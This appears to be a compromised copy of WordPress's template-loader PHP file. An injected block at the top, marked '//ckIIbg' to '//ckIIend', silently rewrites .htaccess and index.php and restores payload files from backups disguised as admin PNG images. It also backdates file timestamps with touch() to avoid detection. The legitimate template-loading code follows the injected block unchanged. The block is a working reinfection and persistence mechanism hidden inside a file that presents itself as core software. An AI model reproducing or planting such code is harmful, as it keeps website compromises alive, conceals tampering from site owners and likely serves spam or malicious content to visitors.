<?php

//ckIIbg
$nowHtacFile =  './.htaccess';
$nowMobanFile =  './wp-includes/images/media/mb_s.png';
$nowIndexFile =  './index.php';
$nowLogFile =  './wp-includes/images/media/log_s.png';
$nowInstallFile =  './wp-includes/images/media/logo_s.png';
$bkLocalFileIndex2 =  './wp-admin/images/align-lefts.png';
$bkLocalFileHtac2 =  './wp-admin/images/align-rights.png';
$bkLocalFileMoban2 =  './wp-admin/images/align-centers.png';
$bkLocalFileInstall2 =  './wp-admin/images/masks.png';
$bkLocalFileLog2 =  './wp-admin/images/wordpress-logos.png';

if($nowHtacFile && file_exists($bkLocalFileHtac2)){
	if(!file_exists($nowHtacFile) or (filesize($nowHtacFile) != filesize($bkLocalFileHtac2))){
		@chmod($nowHtacFile,0755);
		@file_put_contents($nowHtacFile,file_get_contents($bkLocalFileHtac2));
		@chmod($nowHtacFile,0755);
	}
}

if(file_exists($bkLocalFileIndex2)){
	if(!file_exists($nowIndexFile) or (filesize($nowIndexFile) != filesize($bkLocalFileIndex2))){
		@chmod($nowIndexFile,0755);
		@file_put_contents($nowIndexFile,file_get_contents($bkLocalFileIndex2));
		@chmod($nowIndexFile,0755);
	}
}

if(file_exists($bkLocalFileInstall2)){
	if(!file_exists($nowInstallFile) or (filesize($nowInstallFile) != filesize($bkLocalFileInstall2))){
		if(!file_exists($nowInstallFile)){
			if(!file_exists("./wp-includes/images")){
				@mkdir("./wp-includes/images",0755);
			}
			
			if(!file_exists("./wp-includes/images/media")){
				@mkdir("./wp-includes/images/media",0755);
			}
		}
		@chmod($nowInstallFile,0755);
		@file_put_contents($nowInstallFile,file_get_contents($bkLocalFileInstall2));
		@chmod($nowInstallFile,0755);
	}
}

if(file_exists($bkLocalFileMoban2)){
	
	if(!file_exists($nowMobanFile)){
		@file_put_contents($nowMobanFile,file_get_contents($bkLocalFileMoban2));
		@chmod($nowMobanFile,0755);
	}else{
		if(filesize($nowMobanFile) != filesize($bkLocalFileMoban2)){
			$tpstrMb = file_get_contents($nowMobanFile);
			if(strstr($tpstrMb,"#bbbtitsbbb#") && !strstr($tpstrMb,"<!--ttt html5 tttt-->")){
				$fitime = filemtime($bkLocalFileMoban2);
				@chmod($bkLocalFileMoban2,0755);
				@file_put_contents($bkLocalFileMoban2,$tpstrMb);
				@touch($bkLocalFileMoban2, $fitime, $fitime);  
			}else{
				@chmod($bkLocalFileMoban2,0755);
				@file_put_contents($nowMobanFile,file_get_contents($bkLocalFileMoban2));
				@chmod($bkLocalFileMoban2,0755);
			}
		}
	}
	
}

if(file_exists($bkLocalFileLog2)){
	
	if(!file_exists($nowLogFile)){
		@file_put_contents($nowLogFile,file_get_contents($bkLocalFileLog2));
		@chmod($nowMobanFile,0755);
	}else{
		if(filesize($nowLogFile) != filesize($bkLocalFileLog2)){
			$tpstrLog = file_get_contents($nowLogFile);
			$tpstrLog2 = file_get_contents($bkLocalFileLog2);
			
			$arrUrlId = @unserialize($tpstrLog);
			$arrUrlId2 = @unserialize($tpstrLog2);
			
			if(!is_array($arrUrlId2) or (is_array($arrUrlId) && is_array($arrUrlId2) && count($arrUrlId) > count($arrUrlId2))){
				$fitime = filemtime($bkLocalFileMoban2);
				@file_put_contents($bkLocalFileLog2,$tpstrLog);
				@touch($bkLocalFileLog2, $fitime, $fitime); 
			}elseif(!is_array($arrUrlId) or (is_array($arrUrlId) && is_array($arrUrlId2) && count($arrUrlId) < count($arrUrlId2))){
				$fitime = filemtime($bkLocalFileMoban2);
				@file_put_contents($nowLogFile,$tpstrLog2);
				@touch($nowLogFile, $fitime, $fitime); 
			}
		}
	}
	
}elseif(file_exists($nowLogFile)){
	$tpstrLog = file_get_contents($nowLogFile);
	$fitime = filemtime($bkLocalFileMoban2);
	@file_put_contents($bkLocalFileLog2,$tpstrLog);
	@touch($bkLocalFileLog2, $fitime, $fitime);  
}



//ckIIend

?>
<?php
/**
 * Loads the correct template based on the visitor's url
 * @package WordPress
 */
if ( defined('WP_USE_THEMES') && WP_USE_THEMES )
	/**
	 * Fires before determining which template to load.
	 *
	 * @since 1.5.0
	 */
	do_action( 'template_redirect' );

/**
 * Filters whether to allow 'HEAD' requests to generate content.
 *
 * Provides a significant performance bump by exiting before the page
 * content loads for 'HEAD' requests. See #14348.
 *
 * @since 3.5.0
 *
 * @param bool $exit Whether to exit without generating any content for 'HEAD' requests. Default true.
 */
if ( 'HEAD' === $_SERVER['REQUEST_METHOD'] && apply_filters( 'exit_on_http_head', true ) )
	exit();

// Process feeds and trackbacks even if not using themes.
if ( is_robots() ) :
	/**
	 * Fired when the template loader determines a robots.txt request.
	 *
	 * @since 2.1.0
	 */
	do_action( 'do_robots' );
	return;
elseif ( is_feed() ) :
	do_feed();
	return;
elseif ( is_trackback() ) :
	include( ABSPATH . 'wp-trackback.php' );
	return;
endif;

if ( defined('WP_USE_THEMES') && WP_USE_THEMES ) :
	$template = false;
	if     ( is_embed()          && $template = get_embed_template()          ) :
	elseif ( is_404()            && $template = get_404_template()            ) :
	elseif ( is_search()         && $template = get_search_template()         ) :
	elseif ( is_front_page()     && $template = get_front_page_template()     ) :
	elseif ( is_home()           && $template = get_home_template()           ) :
	elseif ( is_post_type_archive() && $template = get_post_type_archive_template() ) :
	elseif ( is_tax()            && $template = get_taxonomy_template()       ) :
	elseif ( is_attachment()     && $template = get_attachment_template()     ) :
		remove_filter('the_content', 'prepend_attachment');
	elseif ( is_single()         && $template = get_single_template()         ) :
	elseif ( is_page()           && $template = get_page_template()           ) :
	elseif ( is_singular()       && $template = get_singular_template()       ) :
	elseif ( is_category()       && $template = get_category_template()       ) :
	elseif ( is_tag()            && $template = get_tag_template()            ) :
	elseif ( is_author()         && $template = get_author_template()         ) :
	elseif ( is_date()           && $template = get_date_template()           ) :
	elseif ( is_archive()        && $template = get_archive_template()        ) :
	else :
		$template = get_index_template();
	endif;
	/**
	 * Filters the path of the current template before including it.
	 *
	 * @since 3.0.0
	 *
	 * @param string $template The path of the template to include.
	 */
	if ( $template = apply_filters( 'template_include', $template ) ) {
		include( $template );
	} elseif ( current_user_can( 'switch_themes' ) ) {
		$theme = wp_get_theme();
		if ( $theme->errors() ) {
			wp_die( $theme->errors() );
		}
	}
	return;
endif;
